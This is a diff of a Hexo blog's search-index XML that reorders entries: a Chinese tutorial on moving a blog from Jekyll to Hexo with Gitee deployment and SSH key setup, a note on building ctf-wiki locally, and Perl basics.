@@ -4,40 +4,11 @@
   
     
     <entry>
-      <title>本地搭建ctf-wiki</title>
-      <link href="2020/12/24/2020-12-24-local_ctf_wiki/"/>
-      <url>2020/12/24/2020-12-24-local_ctf_wiki/</url>
-      
-        <content type="html"><![CDATA[<pre><code># 1. clonegit clone git@github.com:ctf-wiki/ctf-wiki.git# 2. requirementspip install -r requirements.txt -i https://pypi.douban.com/simple/# generate static file in site/mkdocs build# deploy at http://127.0.0.1:8000mkdocs serve</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> ctf </category>
-          
-          <category> pwn </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> ctf </tag>
-            
-            <tag> pwn </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>博客从jekyll迁移至hexo</title>
       <link href="2020/12/24/2020-12-24-blog_migrate/"/>
       <url>2020/12/24/2020-12-24-blog_migrate/</url>
       
-        <content type="html"><![CDATA[<p><a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a></p><p>在2020年快要过去的时候，我打开了自己那个风格早就过时的博客准备重构，原先的博客是长这个样子的。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20201231095847.PNG"></p><p>为什么要迁移自己的博客呢？</p><pre><code>其一是因为，比较Hexo和jekyll的文档就能明显感觉到Hexo比jekyll更加现代，而且Hexo的中文文档也比较完善；其二是因为，年底自己想把今年的博客细致地整理一下，同时希望能够在博客中添加一些额外功能，比如说说、相册、工具箱等等。</code></pre><p>先简单介绍一下迁移前后的框架:</p><pre><code>jekyll: 一个基于ruby的博客框架，不会在本地渲染静态页面，需要将整个页面上传至github.io，由github.io去渲染。Hexo: 由node.js构建的博客框架，会在本地渲染静态页面，再上传到github.io上。</code></pre><p>为什么要搭建个人博客？</p><p>现在大多数人都用手机看朋友圈、微博、抖音等等，而且会不自觉的深陷其中，蓦然发现时间就已经过去了几个小时，刷的时候很开心，可是刷完之后却分外空虚，变得很丧。会发现自己像是个透明的躯壳，脑袋空空，但又双叒叕不愿意改变。</p><p>我也偶尔会这样，因为这些APP给你一种“被喂食”的感觉，直接将一个个新奇事物呈现在我们面前，不需要我们思考；因为在孤寂无人的夜晚，我们最容易感受到自己的无助和空虚。</p><p>这些碎片化的信息通过连续的新鲜内容，不断刺激你的大脑，让你始终处于「啊！又知道了新的东西」的喜悦中，从而难以自拔。但是，这些获得的信息，因为它们缺少跟其他信息的联系，因此难以被我们提取，极其容易被我们遗忘。你以为你得到了很多，但其实你什么都没有得到。这就是为什么会有“进我的收藏夹里吃灰吧”这样的梗，因为这些偶然看到地干货，一时兴起加入收藏，如果不落到实处加入到计划当中，便只是在收藏夹里躺着了。</p><p>所以，本次我想分享的是，如何搭建个人独立博客，建立自己的知识体系，不断记录、温故、知新，拓展自己的思维网络，这将对自己的成长帮助巨大。</p><p>我是为什么萌发搭建博客做记录的想法呢？有时候google半天解决的问题，不做记录的话过一段时间再遇到一样的还会去google找半天，很花费时间。所以解决问题过后，进行总结并记录，会增强记忆并且会内化为自己的知识，下次遇到如果忘了怎么解决，查看自己先前的笔记，也会很快回忆起，并且再次加深理解。</p><p>我的博客地址是mambainveins.gitee.io，之前是使用github+jekyll搭建，本次我将使用gitee+hexo+butterfly搭建，一步步带大家建立自己的博客。</p><p>一、gitee</p><p>码云Gitee 是开源中国社区2013年推出的基于 Git 的代码托管服务，目前已经成为国内最大的代码托管平台，致力于为国内开发者提供优质稳定的托管服务。Gitee 除了提供最基础的 Git 代码托管之外，还提供代码在线查看、历史版本查看、Fork、Pull Request、打包下载任意版本、Issue、Wiki 、保护分支、代码质量检测、PaaS项目演示等方便管理、开发、协作、共享的功能。我们利用gitee来实现将个人博客网页部署在互联网上。</p><p>为什么使用gitee?</p><p>目前国内访问GitHub速度慢，还可能被墙，而Gitee类似国内版的GitHub，访问速度有保证。所以本教程用Gitee来构建个人博客。</p><p>1 .注册gitee账号，访问 <a href="https://gitee.com/">https://gitee.com/</a> ，从首页右上角点击「注册」或点击「加入码云」即可注册个人账号。</p><p>2 .安装Git，git是一个版本控制工具，国外镜像下载巨慢，建议使用淘宝 Git for Windows 镜像 <a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a> 下载git 安装包。按提示逐步安装即可。<br>安装完成后右键菜单中出现Git Bash和Git GUI菜单表明安装成功，</p><ol start="3"><li><p>安装Node.js，通过访问 <a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a> ,根据提示安装node.js<br><a href="https://m.html.cn/qa/node-js/12555.html">https://m.html.cn/qa/node-js/12555.html</a> 查看node.js是否安装成功</p></li><li><p>推荐使用visual studio code，访问<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a> ，选择合适的版本安装。vscode自带的有终端，对不熟悉git操作的小白很友好，同时vscode可以进行配置文件的修改。</p></li></ol><p>博客本质上是一个资源目录，包含了页面文本和各种配置文件 ，我们要在本地建立一个存储个人网站的目录，如命名为Hexo</p><p>二、hexo安装</p><p>Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。我们使用hexo来作为我们博客的框架。</p><p>$ npm install hexo -g<br>npm WARN deprecated <a href="mailto:&#102;&#x73;&#101;&#x76;&#101;&#110;&#x74;&#115;&#x40;&#50;&#46;&#x31;&#x2e;&#x33;">&#102;&#x73;&#101;&#x76;&#101;&#110;&#x74;&#115;&#x40;&#50;&#46;&#x31;&#x2e;&#x33;</a>: Please update to v 2.2.x<br>C:\Users\hsw\AppData\Roaming\npm\hexo -&gt; C:\Users\hsw\AppData\Roaming\npm\node_modules\hexo\bin\hexo<br>npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@~2.1.2 (node_modules\hexo\node_modules\chokidar\node_modules\fsevents):<br>npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for <a href="mailto:&#x66;&#x73;&#101;&#118;&#101;&#x6e;&#116;&#x73;&#x40;&#50;&#x2e;&#x31;&#x2e;&#51;">&#x66;&#x73;&#101;&#118;&#101;&#x6e;&#116;&#x73;&#x40;&#50;&#x2e;&#x31;&#x2e;&#51;</a>: wanted {“os”:”darwin”,”arch”:”any”} (current: {“os”:”win32”,”arch”:”x64”})</p><ul><li><a href="mailto:&#104;&#x65;&#120;&#x6f;&#x40;&#53;&#x2e;&#51;&#46;&#x30;">&#104;&#x65;&#120;&#x6f;&#x40;&#53;&#x2e;&#51;&#46;&#x30;</a><br>added 92 packages from 370 contributors in 35.102s</li></ul><p>$ hexo init MambaInVeins_Blog<br>INFO  Cloning hexo-starter <a href="https://github.com/hexojs/hexo-starter.git">https://github.com/hexojs/hexo-starter.git</a><br>INFO  Install dependencies<br>added 188 packages from 443 contributors and audited 194 packages in 17.023s</p><p>15 packages are looking for funding<br>  run <code>npm fund</code> for details</p><p>found 0 vulnerabilities</p><p>INFO  Start blogging with Hexo!</p><p>$ cd MambaInVeins_Blog</p><p>$ hexo server 可以得到博客的预览，点击即可预览博客</p><p>三、主题</p><p><a href="https://butterfly.js.org/posts/21cfbf15/#%E5%AE%89%E8%A3%9D">https://butterfly.js.org/posts/21cfbf15/#%E5%AE%89%E8%A3%9D</a><br>在你的博客根目錄裏</p><p>git clone -b master <a href="https://gitee.com/iamjerryw/hexo-theme-butterfly.git">https://gitee.com/iamjerryw/hexo-theme-butterfly.git</a> themes/butterfly</p><p>$ git clone -b master <a href="https://gitee.com/iamjerryw/hexo-theme-butterfly.git">https://gitee.com/iamjerryw/hexo-theme-butterfly.git</a> themes/butterfly<br>Cloning into ‘themes/butterfly’…<br>remote: Enumerating objects: 3402, done.<br>remote: Counting objects: 100% (3402/3402), done.<br>remote: Compressing objects: 100% (1688/1688), done.<br>remote: Total 3402 (delta 2225), reused 2556 (delta 1678), pack-reused 0<br>Receiving objects: 100% (3402/3402), 2.00 MiB | 9.12 MiB/s, done.<br>Resolving deltas: 100% (2225/2225), done.</p><p>更换主题：<br>修改站點配置文件_config.yml，把主題改為butterfly<br>theme: butterfly<br>重新使用hexo server命令</p><p>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug<br>如果你沒有 pug 以及 stylus 的渲染器，請下載安裝：<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p><p>再次使用hexo server命令就可以看到新主题的博客了</p><p>升级建议：<br>hexo &gt;5.0.0</p><p>把主題文件夾中的 _config.yml 複製到 Hexo 根目錄裏，同時重新命名為 _config.butterfly.yml。</p><p>以後只需要在 _config.butterfly.yml進行配置就行。</p><p>Hexo會自動合併主題中的_config.yml和 _config.butterfly.yml裏的配置，如果存在同名配置，會使用_config.butterfly.yml的配置，其優先度較高。</p><p>四、网站部署<br>登录自己的gitee账号，选择新建仓库，创建完成后，复制项目地址</p><p>修改Deploy</p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h2 id="Docs-https-hexo-io-docs-one-command-deployment"><a href="#Docs-https-hexo-io-docs-one-command-deployment" class="headerlink" title="Docs: https://hexo.io/docs/one-command-deployment"></a>Docs: <a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></h2><p>deploy:<br>  type: git<br>  repo: <a href="mailto:&#103;&#x69;&#x74;&#x40;&#103;&#105;&#116;&#101;&#x65;&#x2e;&#99;&#x6f;&#109;">&#103;&#x69;&#x74;&#x40;&#103;&#105;&#116;&#101;&#x65;&#x2e;&#99;&#x6f;&#109;</a>:mambainveins/mambainveins.git<br>  branch: master</p><p>修改为自己的项目地址，branch修改为master。<br>注意：冒号后面一定要有空格，否则不能正确识别。</p><p>修改url和root<br>url: <a href="https://mambainveins.gitee.io/mambainveins">https://mambainveins.gitee.io/mambainveins</a><br>root: /mambainveins-blog/</p><p>码云 Gitee 、GitHub 提供了基于 SSH 协议的 Git 服务，在使用 SSH 协议访问仓库仓库之前，需要先配置好账户/仓库的 SSH 公钥。</p><p>配置 ssh 账户和邮箱</p><pre><code>邮箱不必与 GitHub、Gitee 账号相同，个人邮箱即可。git config --global user.email *********@qq.com # 设置邮箱git config --global user.name &#39;****&#39;   # 设置用户名查看账户和邮箱git config --global user.name git config --global user.emailgit config -l本地生成ssh公钥邮箱为刚配置好的账户邮箱ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;按照提示完成三次回车，即可生成 ssh key查看 ssh 公钥cat ~/.ssh/id_rsa.pub复制公钥去 Gitee 粘贴，添加 测试是否连接成功ssh -T git@gitee.com</code></pre><p>hexo deploy<br>安装自动部署发布工具，不然部署会报错<br>npm install hexo-deployer-git –save</p><p>在终端输入hexo deploy命令，完成之后打开我们刚才创建的仓库，我们会发现文件已经上传到了仓库之中，在项目的服务中选择Pages选项，选择 master分支，点击 部署/更新</p><p>我们的博客就成功部署了，稍等一会儿博客就发布成功啦，访问博客地址 <a href="http://mambainveins.gitee.io/mambainveins/">http://mambainveins.gitee.io/mambainveins/</a> ，就可预览在线博客啦！！！</p><p>hexo clean<br>hexo g<br>hexo d</p><p>hexo s</p><p>五、博客配置</p><p>现在我们完成了博客基本配置，想要博客变得更加完整，更加漂亮话，我们还需要进行一些其他的配置，这一部分可以参考butterfly主题的使用说明，进行修改 。<a href="https://demo.jerryc.me/posts/21cfbf15/#%E5%AE%89%E8%A3%9D">https://demo.jerryc.me/posts/21cfbf15/#%E5%AE%89%E8%A3%9D</a></p><p>hexo browsersync插件的使用 <a href="https://www.dazhuanlan.com/2019/12/26/5e04219a60b20/">https://www.dazhuanlan.com/2019/12/26/5e04219a60b20/</a></p><p><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.3.4/images/0465.png">https://cdn.jsdelivr.net/gh/Yafine/cdn@3.3.4/images/0465.png</a> 爬虫 0-465</p><p>六、博客书写</p><p>在终端输入命令hexo new title，我们可以在blog/source/_posts/看到我们创建的新文章。文章是使用markdown格式进行书写，书写后在终端输入hexo clean,hexo deploy命令，然后在仓库界面进行部署更新就ok啦！！！<br>至此，我们的博客就搭建完毕了，小伙伴，快来搭建你的个人博客吧！</p><p><a href="https://yafine-blog.cn/posts/ee35.html">https://yafine-blog.cn/posts/ee35.html</a><br>使用 Jsdelivr/CDN 加速博客访问速度</p><p><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png">https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png</a></p><p>七、购买域名</p><p>腾讯云购买域名 添加域名解析</p><p>在github中找到你的博客仓库。</p><p>点击Seeting</p><p>找到Custom domain</p><p>输入你的域名点击save</p><p>八、留言</p><p>对任何渴望进步的人来说，写博客/文章/回答对自己的成长帮助都是巨大的。频率和数量不必过分强求，有话要说就写写，没事就歇歇，随意点。因为坚持写作的那一刻起，你就已经开始受益。</p><p>学习本就是一件艰难的事情，所以优秀的人永远是凤毛麟角，所谓聪明的人，无非他们把走路、等车、休息等更多的时间花在这上面罢了。再说，学习本身，岂非也是一件很有趣的事情？</p><p>有人说，你的时间花在哪，你就会成为什么样的人。</p>]]></content>
+        <content type="html"><![CDATA[<p><a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a></p><p>在2020年快要过去的时候，我打开了自己那个风格早就过时的博客准备重构，原先的博客是长这个样子的。</p><p><img src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20201231095847.PNG"></p><p>为什么要迁移自己的博客呢？</p><pre><code>其一是因为，比较Hexo和jekyll的文档就能明显感觉到Hexo比jekyll更加现代，而且Hexo的中文文档也比较完善；其二是因为，年底自己想把今年的博客细致地整理一下，同时希望能够在博客中添加一些额外功能，比如说说、相册、工具箱等等。</code></pre><p>先简单介绍一下迁移前后的框架:</p><pre><code>jekyll: 一个基于ruby的博客框架，不会在本地渲染静态页面，需要将整个页面上传至github.io，由github.io去渲染。Hexo: 由node.js构建的博客框架，会在本地渲染静态页面，再上传到github.io上。</code></pre><p>为什么要搭建个人博客？</p><p>现在大多数人都用手机看朋友圈、微博、抖音等等，而且会不自觉的深陷其中，蓦然发现时间就已经过去了几个小时，刷的时候很开心，可是刷完之后却分外空虚，变得很丧。会发现自己像是个透明的躯壳，脑袋空空，但又双叒叕不愿意改变。</p><p>我也偶尔会这样，因为这些APP给你一种“被喂食”的感觉，直接将一个个新奇事物呈现在我们面前，不需要我们思考；因为在孤寂无人的夜晚，我们最容易感受到自己的无助和空虚。</p><p>这些碎片化的信息通过连续的新鲜内容，不断刺激你的大脑，让你始终处于「啊！又知道了新的东西」的喜悦中，从而难以自拔。但是，这些获得的信息，因为它们缺少跟其他信息的联系，因此难以被我们提取，极其容易被我们遗忘。你以为你得到了很多，但其实你什么都没有得到。这就是为什么会有“进我的收藏夹里吃灰吧”这样的梗，因为这些偶然看到地干货，一时兴起加入收藏，如果不落到实处加入到计划当中，便只是在收藏夹里躺着了。</p><p>所以，本次我想分享的是，如何搭建个人独立博客，建立自己的知识体系，不断记录、温故、知新，拓展自己的思维网络，这将对自己的成长帮助巨大。</p><p>我是为什么萌发搭建博客做记录的想法呢？有时候google半天解决的问题，不做记录的话过一段时间再遇到一样的还会去google找半天，很花费时间。所以解决问题过后，进行总结并记录，会增强记忆并且会内化为自己的知识，下次遇到如果忘了怎么解决，查看自己先前的笔记，也会很快回忆起，并且再次加深理解。</p><p>我的博客地址是mambainveins.gitee.io，之前是使用github+jekyll搭建，本次我将使用gitee+hexo+butterfly搭建，一步步带大家建立自己的博客。</p><p>一、gitee</p><p>码云Gitee 是开源中国社区2013年推出的基于 Git 的代码托管服务，目前已经成为国内最大的代码托管平台，致力于为国内开发者提供优质稳定的托管服务。Gitee 除了提供最基础的 Git 代码托管之外，还提供代码在线查看、历史版本查看、Fork、Pull Request、打包下载任意版本、Issue、Wiki 、保护分支、代码质量检测、PaaS项目演示等方便管理、开发、协作、共享的功能。我们利用gitee来实现将个人博客网页部署在互联网上。</p><p>为什么使用gitee?</p><p>目前国内访问GitHub速度慢，还可能被墙，而Gitee类似国内版的GitHub，访问速度有保证。所以本教程用Gitee来构建个人博客。</p><p>1 .注册gitee账号，访问 <a href="https://gitee.com/">https://gitee.com/</a> ，从首页右上角点击「注册」或点击「加入码云」即可注册个人账号。</p><p>2 .安装Git，git是一个版本控制工具，国外镜像下载巨慢，建议使用淘宝 Git for Windows 镜像 <a href="https://npm.taobao.org/mirrors/git-for-windows/">https://npm.taobao.org/mirrors/git-for-windows/</a> 下载git 安装包。按提示逐步安装即可。<br>安装完成后右键菜单中出现Git Bash和Git GUI菜单表明安装成功，</p><ol start="3"><li><p>安装Node.js，通过访问 <a href="https://nodejs.org/zh-cn/">https://nodejs.org/zh-cn/</a> ,根据提示安装node.js<br><a href="https://m.html.cn/qa/node-js/12555.html">https://m.html.cn/qa/node-js/12555.html</a> 查看node.js是否安装成功</p></li><li><p>推荐使用visual studio code，访问<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a> ，选择合适的版本安装。vscode自带的有终端，对不熟悉git操作的小白很友好，同时vscode可以进行配置文件的修改。</p></li></ol><p>博客本质上是一个资源目录，包含了页面文本和各种配置文件 ，我们要在本地建立一个存储个人网站的目录，如命名为Hexo</p><p>二、hexo安装</p><p>Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。我们使用hexo来作为我们博客的框架。</p><p>$ npm install hexo -g<br>npm WARN deprecated <a href="mailto:&#x66;&#x73;&#101;&#x76;&#101;&#110;&#x74;&#x73;&#64;&#x32;&#46;&#49;&#46;&#x33;">&#x66;&#x73;&#101;&#x76;&#101;&#110;&#x74;&#x73;&#64;&#x32;&#46;&#49;&#46;&#x33;</a>: Please update to v 2.2.x<br>C:\Users\hsw\AppData\Roaming\npm\hexo -&gt; C:\Users\hsw\AppData\Roaming\npm\node_modules\hexo\bin\hexo<br>npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@~2.1.2 (node_modules\hexo\node_modules\chokidar\node_modules\fsevents):<br>npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for <a href="mailto:&#x66;&#115;&#101;&#118;&#101;&#110;&#x74;&#x73;&#x40;&#50;&#x2e;&#x31;&#x2e;&#51;">&#x66;&#115;&#101;&#118;&#101;&#110;&#x74;&#x73;&#x40;&#50;&#x2e;&#x31;&#x2e;&#51;</a>: wanted {“os”:”darwin”,”arch”:”any”} (current: {“os”:”win32”,”arch”:”x64”})</p><ul><li><a href="mailto:&#104;&#x65;&#120;&#x6f;&#x40;&#53;&#46;&#x33;&#x2e;&#x30;">&#104;&#x65;&#120;&#x6f;&#x40;&#53;&#46;&#x33;&#x2e;&#x30;</a><br>added 92 packages from 370 contributors in 35.102s</li></ul><p>$ hexo init MambaInVeins_Blog<br>INFO  Cloning hexo-starter <a href="https://github.com/hexojs/hexo-starter.git">https://github.com/hexojs/hexo-starter.git</a><br>INFO  Install dependencies<br>added 188 packages from 443 contributors and audited 194 packages in 17.023s</p><p>15 packages are looking for funding<br>  run <code>npm fund</code> for details</p><p>found 0 vulnerabilities</p><p>INFO  Start blogging with Hexo!</p><p>$ cd MambaInVeins_Blog</p><p>$ hexo server 可以得到博客的预览，点击即可预览博客</p><p>三、主题</p><p><a href="https://butterfly.js.org/posts/21cfbf15/#%E5%AE%89%E8%A3%9D">https://butterfly.js.org/posts/21cfbf15/#%E5%AE%89%E8%A3%9D</a><br>在你的博客根目錄裏</p><p>git clone -b master <a href="https://gitee.com/iamjerryw/hexo-theme-butterfly.git">https://gitee.com/iamjerryw/hexo-theme-butterfly.git</a> themes/butterfly</p><p>$ git clone -b master <a href="https://gitee.com/iamjerryw/hexo-theme-butterfly.git">https://gitee.com/iamjerryw/hexo-theme-butterfly.git</a> themes/butterfly<br>Cloning into ‘themes/butterfly’…<br>remote: Enumerating objects: 3402, done.<br>remote: Counting objects: 100% (3402/3402), done.<br>remote: Compressing objects: 100% (1688/1688), done.<br>remote: Total 3402 (delta 2225), reused 2556 (delta 1678), pack-reused 0<br>Receiving objects: 100% (3402/3402), 2.00 MiB | 9.12 MiB/s, done.<br>Resolving deltas: 100% (2225/2225), done.</p><p>更换主题：<br>修改站點配置文件_config.yml，把主題改為butterfly<br>theme: butterfly<br>重新使用hexo server命令</p><p>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug<br>如果你沒有 pug 以及 stylus 的渲染器，請下載安裝：<br>npm install hexo-renderer-pug hexo-renderer-stylus –save</p><p>再次使用hexo server命令就可以看到新主题的博客了</p><p>升级建议：<br>hexo &gt;5.0.0</p><p>把主題文件夾中的 _config.yml 複製到 Hexo 根目錄裏，同時重新命名為 _config.butterfly.yml。</p><p>以後只需要在 _config.butterfly.yml進行配置就行。</p><p>Hexo會自動合併主題中的_config.yml和 _config.butterfly.yml裏的配置，如果存在同名配置，會使用_config.butterfly.yml的配置，其優先度較高。</p><p>四、网站部署<br>登录自己的gitee账号，选择新建仓库，创建完成后，复制项目地址</p><p>修改Deploy</p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h2 id="Docs-https-hexo-io-docs-one-command-deployment"><a href="#Docs-https-hexo-io-docs-one-command-deployment" class="headerlink" title="Docs: https://hexo.io/docs/one-command-deployment"></a>Docs: <a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></h2><p>deploy:<br>  type: git<br>  repo: <a href="mailto:&#103;&#105;&#116;&#64;&#x67;&#x69;&#116;&#x65;&#x65;&#x2e;&#99;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#x67;&#x69;&#116;&#x65;&#x65;&#x2e;&#99;&#111;&#x6d;</a>:mambainveins/mambainveins.git<br>  branch: master</p><p>修改为自己的项目地址，branch修改为master。<br>注意：冒号后面一定要有空格，否则不能正确识别。</p><p>修改url和root<br>url: <a href="https://mambainveins.gitee.io/mambainveins">https://mambainveins.gitee.io/mambainveins</a><br>root: /mambainveins-blog/</p><p>码云 Gitee 、GitHub 提供了基于 SSH 协议的 Git 服务，在使用 SSH 协议访问仓库仓库之前，需要先配置好账户/仓库的 SSH 公钥。</p><p>配置 ssh 账户和邮箱</p><pre><code>邮箱不必与 GitHub、Gitee 账号相同，个人邮箱即可。git config --global user.email *********@qq.com # 设置邮箱git config --global user.name &#39;****&#39;   # 设置用户名查看账户和邮箱git config --global user.name git config --global user.emailgit config -l本地生成ssh公钥邮箱为刚配置好的账户邮箱ssh-keygen -t rsa -C &quot;xxxxx@xxxxx.com&quot;按照提示完成三次回车，即可生成 ssh key查看 ssh 公钥cat ~/.ssh/id_rsa.pub复制公钥去 Gitee 粘贴，添加 测试是否连接成功ssh -T git@gitee.com</code></pre><p>hexo deploy<br>安装自动部署发布工具，不然部署会报错<br>npm install hexo-deployer-git –save</p><p>在终端输入hexo deploy命令，完成之后打开我们刚才创建的仓库，我们会发现文件已经上传到了仓库之中，在项目的服务中选择Pages选项，选择 master分支，点击 部署/更新</p><p>我们的博客就成功部署了，稍等一会儿博客就发布成功啦，访问博客地址 <a href="http://mambainveins.gitee.io/mambainveins/">http://mambainveins.gitee.io/mambainveins/</a> ，就可预览在线博客啦！！！</p><p>hexo clean<br>hexo g<br>hexo d</p><p>hexo s</p><p>五、博客配置</p><p>现在我们完成了博客基本配置，想要博客变得更加完整，更加漂亮话，我们还需要进行一些其他的配置，这一部分可以参考butterfly主题的使用说明，进行修改 。<a href="https://demo.jerryc.me/posts/21cfbf15/#%E5%AE%89%E8%A3%9D">https://demo.jerryc.me/posts/21cfbf15/#%E5%AE%89%E8%A3%9D</a></p><p>hexo browsersync插件的使用 <a href="https://www.dazhuanlan.com/2019/12/26/5e04219a60b20/">https://www.dazhuanlan.com/2019/12/26/5e04219a60b20/</a></p><p><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.3.4/images/0465.png">https://cdn.jsdelivr.net/gh/Yafine/cdn@3.3.4/images/0465.png</a> 爬虫 0-465</p><p>六、博客书写</p><p>在终端输入命令hexo new title，我们可以在blog/source/_posts/看到我们创建的新文章。文章是使用markdown格式进行书写，书写后在终端输入hexo clean,hexo deploy命令，然后在仓库界面进行部署更新就ok啦！！！<br>至此，我们的博客就搭建完毕了，小伙伴，快来搭建你的个人博客吧！</p><p><a href="https://yafine-blog.cn/posts/ee35.html">https://yafine-blog.cn/posts/ee35.html</a><br>使用 Jsdelivr/CDN 加速博客访问速度</p><p><a href="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png">https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0001.png</a></p><p>七、购买域名</p><p>腾讯云购买域名 添加域名解析</p><p>在github中找到你的博客仓库。</p><p>点击Seeting</p><p>找到Custom domain</p><p>输入你的域名点击save</p><p>八、留言</p><p>对任何渴望进步的人来说，写博客/文章/回答对自己的成长帮助都是巨大的。频率和数量不必过分强求，有话要说就写写，没事就歇歇，随意点。因为坚持写作的那一刻起，你就已经开始受益。</p><p>学习本就是一件艰难的事情，所以优秀的人永远是凤毛麟角，所谓聪明的人，无非他们把走路、等车、休息等更多的时间花在这上面罢了。再说，学习本身，岂非也是一件很有趣的事情？</p><p>有人说，你的时间花在哪，你就会成为什么样的人。</p>]]></content>
       
       
       <categories>
@@ -108,6 +79,35 @@
             <tag> linux </tag>
             
             <tag> shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>本地搭建ctf-wiki</title>
+      <link href="2020/12/24/2020-12-24-local_ctf_wiki/"/>
+      <url>2020/12/24/2020-12-24-local_ctf_wiki/</url>
+      
+        <content type="html"><![CDATA[<pre><code># 1. clonegit clone git@github.com:ctf-wiki/ctf-wiki.git# 2. requirementspip install -r requirements.txt -i https://pypi.douban.com/simple/# generate static file in site/mkdocs build# deploy at http://127.0.0.1:8000mkdocs serve</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> pwn </tag>
             
         </tags>
       
@@ -595,6 +595,33 @@
     
     
     <entry>
+      <title>perl语言简要学习</title>
+      <link href="2020/10/19/2020-10-19-perl_learn/"/>
+      <url>2020/10/19/2020-10-19-perl_learn/</url>
+      
+        <content type="html"><![CDATA[<p>(1)perl -v</p><p>(2)perl -e ‘print “Hello World\n”‘</p><p>(3)hello.pl </p><pre><code>#!/usr/bin/perl# 输出 &quot;Hello, World&quot;print &quot;Hello, world\n&quot;;</code></pre><p>chmod 0755 hello.pl </p><p>./hello.pl </p><p>(4) 注释</p><pre><code># 单行=pod 注释这是一个多行注释这是一个多行注释这是一个多行注释这是一个多行注释=cut</code></pre><p>(5)双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出。</p><p>单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p><p>(6)数据类型 </p><p>标量 在使用时在变量的名字前面加上一个 $</p><pre><code>$myfirst=123;</code></pre><p>数组 数组变量以字符 @ 开头</p><pre><code>@arr=(1,2,3)</code></pre><p>哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值。哈希变量以字符 % 开头。</p><pre><code>%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); </code></pre><p>defined的用法</p><p>函数defined返回0、false或者非0、true。<br>此运算结果依赖于传递给它进行计算的参数的内容。<br>如果参数中不含有字符和数字值，则返回0；如果参数中包含一个字符或者数字值，则返回非0或者true值。<br>这对于判断一个已经建立的数组中的每个元素是否已经定义非常有用。</p><p>注意：此函数作用不是判断某个变量是否已经定义，而是用来判断某个变量是否为空。 </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+          <category> shell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> perl </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Scrapy数据库异步插入，出现数据重复和丢失</title>
       <link href="2020/10/19/2020-10-19-scrapy_deepcopy/"/>
       <url>2020/10/19/2020-10-19-scrapy_deepcopy/</url>
@@ -616,33 +643,6 @@
             <tag> scrapy </tag>
             
             <tag> spider </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>perl语言简要学习</title>
-      <link href="2020/10/19/2020-10-19-perl_learn/"/>
-      <url>2020/10/19/2020-10-19-perl_learn/</url>
-      
-        <content type="html"><![CDATA[<p>(1)perl -v</p><p>(2)perl -e ‘print “Hello World\n”‘</p><p>(3)hello.pl </p><pre><code>#!/usr/bin/perl# 输出 &quot;Hello, World&quot;print &quot;Hello, world\n&quot;;</code></pre><p>chmod 0755 hello.pl </p><p>./hello.pl </p><p>(4) 注释</p><pre><code># 单行=pod 注释这是一个多行注释这是一个多行注释这是一个多行注释这是一个多行注释=cut</code></pre><p>(5)双引号可以正常解析一些转义字符与变量，而单引号无法解析会原样输出。</p><p>单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p><p>(6)数据类型 </p><p>标量 在使用时在变量的名字前面加上一个 $</p><pre><code>$myfirst=123;</code></pre><p>数组 数组变量以字符 @ 开头</p><pre><code>@arr=(1,2,3)</code></pre><p>哈希 哈希是一个无序的 key/value 对集合。可以使用键作为下标获取值。哈希变量以字符 % 开头。</p><pre><code>%h=(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); 